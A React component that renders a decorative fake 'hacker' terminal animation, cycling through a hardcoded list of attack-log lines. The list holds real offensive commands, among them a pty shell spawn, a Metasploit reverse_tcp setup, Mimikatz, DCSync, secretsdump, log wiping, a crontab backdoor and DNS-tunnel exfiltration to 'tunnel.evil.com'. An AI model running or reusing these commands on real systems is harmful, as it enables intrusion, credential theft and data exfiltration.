import React, { useEffect, useRef, useState, useCallback } from 'react';

const LINES = [
  'Initializing exploit framework v4.2.1...', 'Loading CVE-2024-1337 payload...', 'ICMP sweep complete: 4096 hosts scanned',
  'Port 22 open on 192.168.1.147', 'Port 443 open on 192.168.1.147', 'SSH fingerprint: SHA256:x7Kp9...',
  'Attempting privilege escalation via SUID binary...', 'sudo -l: Matching Defaults entries...',
  '(ALL) NOPASSWD: /usr/bin/python3', 'Shell spawned: python3 -c \'import pty; pty.spawn("/bin/bash")\'',
  'whoami: root', 'uname -a: Linux target 5.15.0-58-generic #64-Ubuntu', 'Dumping /etc/shadow...',
  'root:$6$rounds=5000$... cracked: password123', 'Pivoting to internal network 10.0.0.0/24',
  'Metasploit: exploit/linux/ssh/sshexec → PAYLOAD=linux/x64/meterpreter/reverse_tcp',
  'LHOST=10.10.14.5 LPORT=4444', 'msf6 exploit(linux/ssh/sshexec) > run',
  '[*] Started reverse TCP handler on 10.10.14.5:4444', '[*] 10.0.0.12:22 - Attempting to login...',
  '[+] 10.0.0.12:22 - Success: root:toor', 'Meterpreter session 3 opened',
  'meterpreter > getuid: Server username: root', 'meterpreter > sysinfo: Computer: DC01.corp.local',
  'meterpreter > hashdump:', 'Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::',
  'BloodHound: Collecting AD data...', 'SharpHound.exe -c All --OutputDirectory /tmp/',
  'Domain Controller found: DC01.corp.local', 'Kerberoasting: krbtgt hash captured',
  'Mimikatz: sekurlsa::logonpasswords', 'Password: P@ssw0rd1234 (Domain Admin)',
  'Pass-the-hash: Administrator@DC01.corp.local', 'DCSync: NTDS.dit extracted',
  'Exfiltrating 2.3GB via DNS tunneling...', 'iodine -f -P s3cr3t tunnel.evil.com',
  'Data exfil complete. Cleaning logs...', 'Wiping /var/log/auth.log', 'Deleting bash history...',
  'Persistence: crontab -e → @reboot /tmp/.hidden_shell', 'Backdoor installed on port 31337',
  'C2 beacon established: 15s heartbeat', 'OPSEC: Using Cloudflare worker as redirector',
  'Scanning for antivirus... CrowdStrike detected. Evading...', 'Sleep 86400 && ./payload_obfuscated',
  'Lateral movement to FILESERVER01...', 'SMB: NT_STATUS_LOGON_FAILURE... rotating creds',
  '[*] Credential verified on FILESERVER01', 'Shadow copy: VSS created',
  'Downloading SAM database via secretsdump.py', 'SYSTEM/SAM extraction complete',
];

interface Props { active: boolean; onClose: () => void; }

export default function HackerCinema({ active, onClose }: Props) {
  const [lines, setLines] = useState<string[]>([]);
  const [cursor, setCursor] = useState('');
  const intervalRef = useRef<ReturnType<typeof setInterval>>();
  const containerRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    if (!active) { setLines([]); clearInterval(intervalRef.current); return; }
    let i = 0;
    intervalRef.current = setInterval(() => {
      const line = LINES[Math.floor(Math.random() * LINES.length)];
      setLines(prev => [...prev.slice(-60), line]);
      i++;
    }, 180);
    return () => clearInterval(intervalRef.current);
  }, [active]);

  useEffect(() => {
    const id = setInterval(() => setCursor(c => c === '_' ? '' : '_'), 500);
    return () => clearInterval(id);
  }, []);

  useEffect(() => {
    if (containerRef.current) containerRef.current.scrollTop = containerRef.current.scrollHeight;
  }, [lines]);

  useEffect(() => {
    if (!active) return;
    const handler = (e: KeyboardEvent) => { if (e.key === 'Escape') onClose(); };
    window.addEventListener('keydown', handler);
    return () => window.removeEventListener('keydown', handler);
  }, [active, onClose]);

  if (!active) return null;

  return (
    <div className="fixed inset-0 z-[250] bg-black flex flex-col font-mono" onClick={onClose}>
      <div className="flex items-center justify-between px-4 py-2 border-b border-green-500/20 bg-black/80">
        <div className="flex items-center gap-2">
          <div className="w-3 h-3 rounded-full bg-red-500 cursor-pointer" onClick={onClose} />
          <div className="w-3 h-3 rounded-full bg-yellow-500" />
          <div className="w-3 h-3 rounded-full bg-green-500" />
          <span className="ml-3 text-[10px] text-green-500/60 tracking-widest uppercase">root@cybersentinel:~# [CINEMA MODE — PRESS ESC OR CLICK TO EXIT]</span>
        </div>
      </div>
      <div ref={containerRef} className="flex-1 overflow-hidden p-4 space-y-0.5" onClick={e => e.stopPropagation()}>
        {lines.map((line, i) => {
          const isError = line.includes('ERROR') || line.includes('FAIL');
          const isSuccess = line.includes('[+]') || line.includes('Success') || line.includes('root') || line.includes('complete');
          const isSystem = line.startsWith('[*]');
          return (
            <div key={i} className={`text-xs leading-relaxed ${isError ? 'text-red-400' : isSuccess ? 'text-green-300' : isSystem ? 'text-cyan-400/80' : 'text-green-500/90'}`}
              style={{ textShadow: isSuccess ? '0 0 8px #00ff00' : undefined }}>
              {i === lines.length - 1 ? (
                <span>$ {line}{cursor}</span>
              ) : (
                <span>$ {line}</span>
              )}
            </div>
          );
        })}
      </div>
    </div>
  );
}
